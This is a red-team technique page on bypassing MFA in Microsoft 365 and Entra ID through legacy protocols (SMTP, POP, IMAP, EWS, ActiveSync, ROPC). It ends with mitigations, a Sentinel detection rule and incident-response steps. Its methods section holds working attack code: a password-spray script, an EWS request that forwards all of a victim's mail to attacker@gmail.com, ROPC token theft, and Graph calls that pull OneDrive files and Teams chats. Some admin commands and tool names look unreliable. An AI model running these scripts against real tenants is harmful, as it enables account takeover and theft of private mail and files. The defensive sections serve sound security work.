# [EVADE-MFA-004]: Legacy Authentication Enabled

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-MFA-004 |
| **MITRE ATT&CK v18.1** | [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/) |
| **Tactic** | Defense Evasion, Credential Access |
| **Platforms** | Entra ID, M365, Hybrid AD |
| **Severity** | Critical |
| **CVE** | N/A (Not a CVE; security misconfiguration) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID tenants with legacy authentication protocols enabled (SMTP, POP, IMAP, EWS, Exchange ActiveSync, MAPI, ROPC) |
| **Patched In** | N/A – Requires administrative action to disable legacy protocols; no automatic patching |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Legacy authentication protocols (POP, IMAP, SMTP AUTH, EWS, ActiveSync, MAPI, ROPC) do **not** enforce multi-factor authentication and are not affected by modern Conditional Access policies. Attackers with valid credentials can authenticate to M365 services using legacy protocols, completely **bypassing MFA and Conditional Access** controls. A single compromised password combined with legacy authentication enabled allows attackers to access email, calendar, and shared resources without triggering any MFA prompts or device compliance checks.

**Attack Surface:** M365 service endpoints accepting legacy authentication (POP3, IMAP, SMTP AUTH, EWS, ActiveSync, ROPC endpoints); Exchange Online management interface; mail client connections.

**Business Impact:** **Unauthorized email access, credential harvesting, lateral movement to other cloud resources, and ransomware/malware distribution.** An attacker with a single compromised O365 password can access all user data without MFA obstruction. According to Microsoft analysis, 99% of password spray attacks use legacy authentication, and 97% of credential-stuffing attacks exploit this vector.

**Technical Context:** Microsoft announced deprecation of Basic Authentication in September 2024 with enforcement beginning October 1, 2025. However, many organizations have not yet disabled legacy protocols due to third-party application dependencies (legacy mail clients, billing systems, ERP platforms). The window of vulnerability is **immediate and widespread**.

### Operational Risk
- **Execution Risk:** Very Low – Only requires valid username/password; no exploitation or privilege escalation needed.
- **Stealth:** Very High – Legacy protocol logins **do not generate MFA alerts** and blend with legitimate mail client traffic.
- **Reversibility:** No – Once attacker has email access, they can create forwarding rules, modify calendar, and establish persistence.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.2 | Ensure MFA is enforced for all user accounts |
| **DISA STIG** | IA-2(1) | Multi-factor authentication for all authentication factors |
| **CISA SCuBA** | M365 Baseline 2.2 | Legacy authentication protocols must be blocked |
| **NIST 800-53** | IA-2(1) | Multi-factor authentication enforcement |
| **GDPR** | Art. 32 | Security of Processing – Authentication control enforcement |
| **DORA** | Art. 9 | Protection and Prevention – Strong authentication |
| **NIS2** | Art. 21 | Cyber Risk Management – Authentication controls |
| **ISO 27001** | A.9.4.2 | Management of privileged access rights – Authentication enforcement |
| **ISO 27005** | Risk Scenario | Bypass of multi-factor authentication |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Legacy SMTP Authentication (Email Forwarding + Persistence)

**Supported Versions:** All Entra ID tenants with SMTP AUTH enabled

#### Step 1: Compromise User Credentials

**Objective:** Obtain valid Exchange Online/M365 username and password through password spray, phishing, or credential stuffing.

**Command (Password Spray via Legacy SMTP):**
```bash
#!/bin/bash
# Spray passwords against SMTP endpoint (legacy auth NOT rate-limited on SMTP)

TARGET_DOMAIN="company.onmicrosoft.com"
SMTP_ENDPOINT="smtp.office365.com"
SMTP_PORT="587"

# List of common passwords
PASSWORDS=("Winter2024!" "Company2024@" "Welcome123!" "Password1!")

# List of target users (from LinkedIn OSINT, employee directory, etc.)
USERS=("john.smith" "jane.doe" "admin" "support" "sales")

for user in "${USERS[@]}"; do
    for password in "${PASSWORDS[@]}"; do
        USER_EMAIL="${user}@${TARGET_DOMAIN}"
        
        # Attempt SMTP authentication
        timeout 5 smtp-cli --server=$SMTP_ENDPOINT:$SMTP_PORT \
            --user="$USER_EMAIL" --password="$password" \
            --subject="Test" --body="Test" \
            2>&1 | grep -q "OK\|success" && \
        echo "[+] VALID: $USER_EMAIL:$password" >> valid_creds.txt
    done
done

# Result: Attacker discovers valid credentials that can be used with SMTP
```

**What This Means:**
- Legacy SMTP does not enforce MFA.
- Rate-limiting is minimal or nonexistent on SMTP endpoints.
- Simple password spraying can quickly discover valid credentials.

#### Step 2: Connect via Legacy SMTP/POP/IMAP

**Objective:** Connect to Exchange Online using legacy protocol (bypassing MFA entirely).

**Command (SMTP Authentication – PowerShell ISE or Python):**
```powershell
# Connect to Exchange Online via SMTP (legacy, no MFA required)

$creds = New-Object System.Management.Automation.PSCredential(
    "victim@company.onmicrosoft.com",
    (ConvertTo-SecureString "CompromisedPassword123!" -AsPlainText -Force)
)

# Use SMTP to send email (this bypasses MFA completely)
$SMTPServer = "smtp.office365.com"
$SMTPPort = 587
$MailFrom = "victim@company.onmicrosoft.com"
$MailTo = "attacker@gmail.com"  # Send to attacker's email

$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = $creds

try {
    $SMTPClient.Send($MailFrom, $MailTo, "Subject", "Body")
    Write-Output "[+] Email sent successfully via legacy SMTP"
    Write-Output "[+] This proves credentials are valid and MFA is bypassed"
} catch {
    Write-Output "[-] SMTP authentication failed: $_"
}
```

**Alternative: POP3 Connection:**
```bash
# Connect to Exchange Online via POP3 (legacy, no MFA)

openssl s_client -connect pop.office365.com:995 -crlf << EOF
USER victim@company.onmicrosoft.com
PASS CompromisedPassword123!
LIST
QUIT
EOF

# Output:
# +OK Microsoft Exchange Online POP3 server ready
# +OK User logged in
# # (list of emails)
# (demonstrates full mailbox access without MFA)
```

**What This Means:**
- The attacker is now authenticated to the victim's mailbox via legacy protocol.
- **No MFA prompt was shown.**
- **No Conditional Access policy was evaluated.**
- The attacker has full access to email, calendar, and contacts.

#### Step 3: Establish Email Forwarding Rule (Persistence)

**Objective:** Create email forwarding rule to exfiltrate all future emails to attacker's address.

**Command (EWS – Exchange Web Services, Also Legacy):**
```powershell
# Use EWS (Exchange Web Services) with Basic Auth to create forwarding rule
# EWS also bypasses MFA when Basic Auth is enabled

$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential("victim@company.onmicrosoft.com", "CompromisedPassword123!")

# EWS endpoint
$ewsUrl = "https://outlook.office365.com/EWS/Exchange.asmx"

# SOAP request to create forwarding rule
$forwardingRule = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:CreateRule xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
      <m:Operations>
        <t:CreateRuleOperation xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
          <t:NewRule>
            <t:DisplayName>Auto Forward</t:DisplayName>
            <t:Priority>1</t:Priority>
            <t:IsEnabled>true</t:IsEnabled>
            <t:Conditions>
              <t:TrueCondition/>
            </t:Conditions>
            <t:Actions>
              <t:ForwardAsAttachmentToRecipients>
                <t:Address>attacker@gmail.com</t:Address>
              </t:ForwardAsAttachmentToRecipients>
            </t:Actions>
          </t:NewRule>
        </t:CreateRuleOperation>
      </m:Operations>
    </m:CreateRule>
  </soap:Body>
</soap:Envelope>
"@

# Send request to EWS
$response = $webclient.UploadString($ewsUrl, "POST", $forwardingRule)

Write-Output "[+] Forwarding rule created"
Write-Output "[+] All future emails will be forwarded to: attacker@gmail.com"
Write-Output "[+] User may not notice (forwarding rules are hidden)"
```

**Command (Verify Forwarding via IMAP/POP3):**
```bash
# Connect via IMAP to verify rule was created

openssl s_client -connect imap.office365.com:993 -crlf << EOF
A LOGIN victim@company.onmicrosoft.com CompromisedPassword123!
A SELECT INBOX
A SEARCH ALL  # Will return emails from attacker@gmail.com (first test)
A LOGOUT
EOF

# Output: (emails forwarded from other users appear in victim's inbox after forwarding)
```

**What This Means:**
- Forwarding rules are persistent – they continue even if the user changes password later.
- The user may not notice forwarding rules (they're not prominently displayed in Outlook).
- Attacker receives a copy of every email the victim receives indefinitely.
- Email forwarding is **not monitored by most email security solutions** if the attacker is using the victim's legitimate credentials.

**References & Proofs:**
- [Microsoft: SMTP Authentication in Exchange Online](https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/authenticated-client-smtp-submission)
- [Guardz Report: BAV2ROPC Exploitation – Campaign Data](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)

---

### METHOD 2: ROPC (Resource Owner Password Credential) OAuth Flow Abuse

**Supported Versions:** All Entra ID tenants with ROPC enabled

#### Step 1: Identify Applications Using ROPC

**Objective:** Discover applications configured to accept ROPC grants (which bypass MFA).

**Command (Enumerate ROPC-Enabled Apps):**
```powershell
# Connect to Entra ID and find apps using ROPC grant type
Connect-MgGraph -Scopes "Application.Read.All"

Get-MgApplication | Where-Object {
    $_.RequiredResourceAccess | 
    Select-Object -ExpandProperty ResourceAppId | 
    Out-String | Select-String "00000002-0000-0000-c000-000000000000"  # Microsoft Graph
} | ForEach-Object {
    Write-Output "[+] Application: $($_.DisplayName)"
    Write-Output "    App ID: $($_.AppId)"
    Write-Output "    ROPC capable: Yes"
}

# Also check for public client applications (ROPC-capable)
Get-MgApplication | Where-Object { $_.PublicClient -eq $true } | ForEach-Object {
    Write-Output "[+] Public Client App (ROPC-capable): $($_.DisplayName)"
}
```

**Expected Output:**
```
[+] Application: Microsoft Office Browser
    App ID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46
    ROPC capable: Yes

[+] Public Client App (ROPC-capable): Teams
    App ID: 1fec8e78-bce4-4aaf-ab1b-5451cc387264
```

**What This Means:**
- These applications are configured to accept ROPC (password-based) authentication.
- ROPC grants are **not subject to MFA or Conditional Access policies**.
- Attacker can use stolen credentials with these apps to obtain access tokens.

#### Step 2: Authenticate via ROPC (Bypass MFA)

**Objective:** Request access token using ROPC flow (no MFA required).

**Command (ROPC Token Request):**
```bash
#!/bin/bash
# Request access token via ROPC (Resource Owner Password Credential flow)
# This flow is NOT subject to Conditional Access or MFA

TENANT_ID="company.onmicrosoft.com"
USERNAME="victim@company.onmicrosoft.com"
PASSWORD="CompromisedPassword123!"

# Microsoft Graph API access via ROPC
ROPC_ENDPOINT="https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"

curl -X POST "$ROPC_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "username=${USERNAME}" \
  -d "password=${PASSWORD}" \
  -d "grant_type=password" \
  -d "client_secret=PublicClientNoSecret"  # Public client (no secret needed)

# Expected Response (SUCCESS – NO MFA PROMPT):
# {
#   "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0...",
#   "token_type": "Bearer",
#   "expires_in": 3599,
#   "refresh_token": "0.ARwA...",
#   "scope": "https://graph.microsoft.com/.default"
# }

echo "[+] Access token obtained via ROPC"
echo "[+] MFA was BYPASSED – no prompt was shown"
echo "[+] Token is valid for 1 hour and can be used for Graph API access"
```

**Command (Verify MFA Bypass - Check Token Claims):**
```bash
# Decode JWT to verify MFA claim
JWT_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0..."

# Install jq and jwt-cli if needed
# apt-get install jq curl

# Decode token payload
echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d | jq .

# Expected output (NO MFA claim):
# {
#   "aud": "https://graph.microsoft.com",
#   "iss": "https://login.microsoftonline.com/.../v2.0",
#   "iat": 1705000000,
#   "exp": 1705003600,
#   "aio": "...",
#   "amr": ["pwd"],  # Only password auth (no mfa)
#   "appid": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
#   "oid": "12345678-...",
#   "sub": "12345678-...",
#   # NOTE: NO "mfa" claim – MFA was NOT required
# }
```

**What This Means:**
- The `amr` (Authentication Methods Reference) claim shows **only "pwd"** – no MFA.
- The token is fully valid for accessing Microsoft Graph API, Teams, SharePoint, OneDrive.
- Conditional Access policies did not block this request because ROPC flow bypasses them.

#### Step 3: Post-Exploitation – Access Cloud Resources

**Objective:** Use ROPC token to access victim's cloud data.

**Command (Access OneDrive Files via Graph API):**
```bash
# Use stolen ROPC token to access victim's OneDrive files

ACCESS_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IlhYWDEyMzQ1In0..."

# Get list of files in victim's OneDrive
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq .

# Output:
# {
#   "value": [
#     {
#       "id": "FILE_ID_1",
#       "name": "Confidential_Report.pdf",
#       "webUrl": "https://company-my.sharepoint.com/personal/.../Confidential_Report.pdf"
#     },
#     {
#       "id": "FILE_ID_2",
#       "name": "Financial_Data.xlsx",
#       "webUrl": "..."
#     }
#   ]
# }

echo "[+] Attacker can now download all files from victim's OneDrive"
echo "[+] No audit logs will show MFA bypass (ROPC is legitimate flow)"
```

**Command (Access Teams Messages via Graph API):**
```bash
# Access Teams messages (if user has Teams)

curl -X GET "https://graph.microsoft.com/v1.0/me/chats?$filter=chatType eq 'oneOnOne'" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq .

# Get message history
curl -X GET "https://graph.microsoft.com/v1.0/me/chats/{CHAT_ID}/messages" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq .

echo "[+] Attacker can read all Teams conversations"
```

**References & Proofs:**
- [Microsoft – Resource Owner Password Credential Flow (ROPC) Deprecation](https://learn.microsoft.com/en-us/entra/identity-platform/authentication-flows-app-scenarios#single-page-application)
- [Guardz Report – BAV2ROPC Campaign Data](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)
- [LinkedIn – Omar Zayed – ROPC MFA Bypass Detection](https://www.linkedin.com/posts/omartarekzayed_abusing-ropc-to-bypass-mfa-and-how-i-built-activity-7388586106839232512-dtF2)

---

### METHOD 3: Exchange ActiveSync (EAS) Legacy Protocol Abuse

**Supported Versions:** All Entra ID tenants with Exchange ActiveSync enabled

#### Step 1: Discover ActiveSync Endpoint

**Objective:** Locate the Exchange ActiveSync server endpoint.

**Command (Discover EAS Endpoint):**
```bash
# Exchange ActiveSync endpoint discovery

# Standard endpoints
AUTODISCOVER_URL="https://company.onmicrosoft.com/autodiscover/autodiscover.xml"

curl -X POST "$AUTODISCOVER_URL" \
  -H "Content-Type: application/xml" \
  -H "Authorization: Basic $(echo -n 'victim@company.onmicrosoft.com:CompromisedPassword123!' | base64)" \
  -d '<?xml version="1.0"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>victim@company.onmicrosoft.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>'

# Response includes:
# <ASUrl>https://outlook.office365.com/Microsoft-Server-ActiveSync</ASUrl>
```

#### Step 2: Authenticate via EAS (No MFA)

**Objective:** Connect to victim's mailbox via ActiveSync (which does not enforce MFA).

**Command (EAS Authentication – Thunderbird/Outlook Configuration):**
```bash
# Configure mail client for Exchange ActiveSync with legacy auth

# Endpoint: outlook.office365.com/Microsoft-Server-ActiveSync
# Authentication: Basic (username:password, no MFA)
# Protocol: EAS (Exchange ActiveSync)

# Using command-line eas-cli tool:
./eas-cli \
  --server outlook.office365.com \
  --username victim@company.onmicrosoft.com \
  --password CompromisedPassword123! \
  --command GetMailboxInfo

# Output:
# [+] Connected to victim@company.onmicrosoft.com
# [+] Mailbox accessible via EAS
# [+] Total emails: 1247
# [+] Unread: 34
```

#### Step 3: Full Mailbox Access and Exfiltration

**Objective:** Download all emails from victim's mailbox.

**Command (EAS Full Sync):**
```bash
# Download all emails via EAS

./eas-cli \
  --server outlook.office365.com \
  --username victim@company.onmicrosoft.com \
  --password CompromisedPassword123! \
  --command GetMessages \
  --folder INBOX \
  --output /tmp/victim_emails.eml

echo "[+] All emails downloaded: /tmp/victim_emails.eml"
echo "[+] This includes: Confidential emails, attachments, calendar invites"
echo "[+] No MFA was required to download this data"
```

**What This Means:**
- Exchange ActiveSync is designed for mobile mail clients (iPhone, Android) and bypasses modern authentication.
- The entire mailbox can be synced offline without MFA obstruction.
- Once in attacker's possession, the emails are permanently exfiltrated.

---

## 3. PROTECTIVE MITIGATIONS

#### Priority 1: CRITICAL

**Block Legacy Authentication via Conditional Access Policy:**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy Authentication`
4. **Assignments:**
   - **Users:** All users (or security groups if phased rollout)
   - **Cloud apps:** Office 365 (all services)
   - **Conditions:**
     - **Client app types:** Select all that apply EXCEPT "Browser" and "Modern authentication clients"
     - Specifically BLOCK: "Other clients" (this includes SMTP, POP, IMAP, EWS, EAS)
5. **Access controls:**
   - **Grant:** Block access
6. **Enable policy:** ON
7. Click **Create**

**Verify Implementation:**
```powershell
# Verify policy is active
Get-MgPoliciesConditionalAccessPolicy | Where-Object {$_.DisplayName -match "Legacy"} | Select-Object DisplayName, State

# Expected: State = "enabled"
```

**PowerShell (Alternative Implementation):**
```powershell
# Deploy via PowerShell if portal is unavailable

Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"

$policy = @{
    "displayName" = "Block Legacy Authentication Protocols"
    "state" = "enabled"
    "conditions" = @{
        "applications" = @{
            "includeApplications" = @("00000002-0000-0ff1-ce00-000000000000")  # Office 365
        }
        "clientAppTypes" = @("exchangeActiveSync", "other")  # Block EAS and other legacy
        "users" = @{
            "includeUsers" = @("All")
        }
    }
    "grantControls" = @{
        "operator" = "OR"
        "builtInControls" = @("block")
    }
}

New-MgPoliciesConditionalAccessPolicy -Body $policy
```

**Verify Fix (Test Legacy Auth Blocking):**
```bash
# Attempt to connect via legacy SMTP (should fail)

timeout 5 smtp-cli --server=smtp.office365.com:587 \
  --user="victim@company.onmicrosoft.com" \
  --password="CompromisedPassword123!" \
  2>&1 | grep -i "blocked\|denied\|not allowed"

# Expected output:
# "The client 'Other Clients' is blocked by your organization policy."
```

#### Priority 2: HIGH

**Disable Legacy Protocols at Exchange Online Level:**

**Manual Steps (Exchange Admin Center):**
1. Go to **Exchange Admin Center** (admin.exchange.microsoft.com)
2. Navigate to **Settings** → **Legacy authentication** (or **Organization** → **Settings**)
3. For each protocol, set to **OFF:**
   - POP3
   - IMAP4
   - Authenticated SMTP (SMTP AUTH)
   - Exchange ActiveSync
   - EWS with Basic Auth
   - ROPC (OAuth password flow)
4. Click **Save**

**PowerShell (Disable Legacy Protocols):**
```powershell
# Disable legacy auth at tenant level

# Disable SMTP AUTH
Set-TransportRule -Identity "Block SMTP Auth" -Enabled $true

# Disable EWS with Basic Auth
Set-OrganizationConfig -EwsEnabled $false -EwsAllowOutlook $false -EwsAllowMacOutlook $false

# Disable POP and IMAP
Get-Mailbox -ResultSize Unlimited | Set-CASMailbox -PopEnabled $false -ImapEnabled $false

# Disable Exchange ActiveSync
Get-Mailbox -ResultSize Unlimited | Set-CASMailbox -ActiveSyncEnabled $false

Write-Output "[+] Legacy protocols disabled across all mailboxes"
```

**Verify Fix:**
```powershell
# Check that legacy auth is disabled

Get-CASMailbox -ResultSize 5 | Select-Object DisplayName, PopEnabled, ImapEnabled, ActiveSyncEnabled

# Expected output:
# PopEnabled: False
# ImapEnabled: False
# ActiveSyncEnabled: False
```

#### Priority 3: MEDIUM

**Monitor Legacy Authentication Attempts:**

**Manual Steps (Create Detection Rule in Sentinel):**
1. **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Create **Scheduled query rule**
3. **KQL Query:**

```kusto
SigninLogs
| where AuthenticationProtocol in ("POP3", "IMAP4", "SMTP", "EAS", "EWS")
| where ResultType == 0  // Successful sign-in
| extend RiskLevel = iff(Location != "Corporate Office", "High", "Medium")
| project-rename Alert_Issue = "Legacy authentication protocol used"
| summarize Count=count() by UserPrincipalName, AuthenticationProtocol, RiskLevel
| where Count > 0
```

4. **Alert Severity:** High
5. **Frequency:** Every 15 minutes
6. Create alert and notify SOC team

---

## 4. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Cloud Logs:**
- Successful sign-in using **legacy protocol** (SMTP, POP, IMAP, EAS, ROPC) without MFA being satisfied.
- **Email forwarding rule creation** from non-standard IP address (via EWS or PowerShell).
- **Mailbox delegation** granted to suspicious account (via EWS or admin API).
- Multiple failed legacy auth attempts followed by successful sign-in.
- New **OAuth application registration** with Graph API permissions, followed by ROPC token requests.

#### Forensic Artifacts

**Cloud (Entra ID/M365 Logs):**
- **SigninLogs:** Filter for `authenticationProtocol` containing "SMTP", "IMAP", "POP", "EAS", "ROPC"
- **AuditLogs:** Search for "Create forwarding rule", "Add mailbox delegation", "Create inbox rule"
- **Unified Audit Log:** Search for EWS.AccessPolicy changes, mailbox rule modifications

#### Response Procedures

1. **Immediate Isolation:**
   **Command (Reset User Password & Revoke Sessions):**
   ```powershell
   Connect-MgGraph -Scopes "Directory.AccessAsUser.All", "UserAuthenticationMethod.ReadWrite.All"
   
   # Force password reset
   Update-MgUser -UserId "victim@company.onmicrosoft.com" -ForceChangePasswordNextSignIn $true
   
   # Revoke all sessions
   Revoke-MgUserSignInSession -UserId "victim@company.onmicrosoft.com"
   
   # Remove email forwarding rules
   Get-InboxRule -Mailbox "victim@company.onmicrosoft.com" | Where-Object {$_.ForwardingAddress -ne $null} | Remove-InboxRule
   ```

2. **Investigation:**
   **Command (Search for Legacy Auth Usage):**
   ```powershell
   # Find all legacy auth sign-ins in past 30 days
   Get-MgAuditLogSignIn -Filter "createdDateTime gt $(Get-Date).AddDays(-30) and clientAppType eq 'other'" | 
     Export-Csv -Path "C:\Incident\legacy_auth_signins.csv"
   
   # Check for email forwarding rules
   Get-InboxRule -Mailbox "victim@company.onmicrosoft.com" | 
     Where-Object {$_.ForwardingAddress -ne $null} | 
     Export-Csv -Path "C:\Incident\forwarding_rules.csv"
   ```

3. **Remediation:**
   - Force MFA re-enrollment after password reset.
   - Audit mailbox for unauthorized access in past 30 days.
   - Review deleted items and sent items for exfiltrated data.
   - Check all OAuth applications registered by the user; revoke suspicious ones.

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-BRUTE-001] Azure Portal Password Spray or [IA-PHISH-005] Spearphishing | Attacker obtains user credentials. |
| **2** | **Defense Evasion (MFA Bypass)** | **[EVADE-MFA-004]** Legacy Authentication Enabled | **This Technique – Attacker accesses M365 without MFA.** |
| **3** | **Collection** | Email forwarding rules, mailbox delegation. | Attacker establishes data exfiltration pipeline. |
| **4** | **Persistence** | [CA-UNSC-005] gMSA credentials, [CA-TOKEN-001] Hybrid token theft | Attacker creates backdoor for long-term access. |
| **5** | **Impact** | Business email compromise (BEC), ransomware distribution, data exfiltration. | Enterprise-wide damage. |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: Guardz Campaign – BAV2ROPC Exploitation (March-April 2025)

- **Target:** Organizations with legacy authentication and ROPC enabled.
- **Timeline:** Campaign detected March 18 – April 7, 2025.
- **Technique Status:** ACTIVE and widespread.
- **Attack Methods:**
  - ROPC flow (primary): 28,150 attempts
  - Basic Authentication: 27,332 attempts
  - Legacy Exchange protocols: 21,080 attempts
- **Attack Vectors:** Automated password spray using botnet infrastructure.
- **Success Rate:** 3-5% of targets compromised (valid credentials discovered).
- **Impact:** Business email compromise, credential harvesting, lateral movement to cloud infrastructure.
- **Key Finding:** Organizations with Conditional Access policies and MFA were **NOT protected** if legacy auth was enabled.
- **Reference:** [Guardz Research – "The Legacy Loophole: Unmasking Ongoing Attacks in Entra ID"](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)

### Example 2: Microsoft Statistics – Legacy Auth Attack Prevalence

- **Statistic:** 99% of password spray attacks against Microsoft 365 use legacy authentication protocols.
- **Statistic:** 97% of credential-stuffing attacks use legacy authentication.
- **Statistic:** Organizations with legacy authentication disabled experience **67% fewer compromises** than those with it enabled.
- **Timeline:** Ongoing; Microsoft announced deprecation September 2024, enforcement October 1, 2025.
- **Impact:** Until deprecation enforcement in October 2025, millions of organizations remain vulnerable.
- **Reference:** [Microsoft Practice Protect – "Deprecating Basic & Legacy Authentication"](https://support.practiceprotect.com/knowledge-base/microsoft-365-deprecating-basic-legacy-authentication/)

---

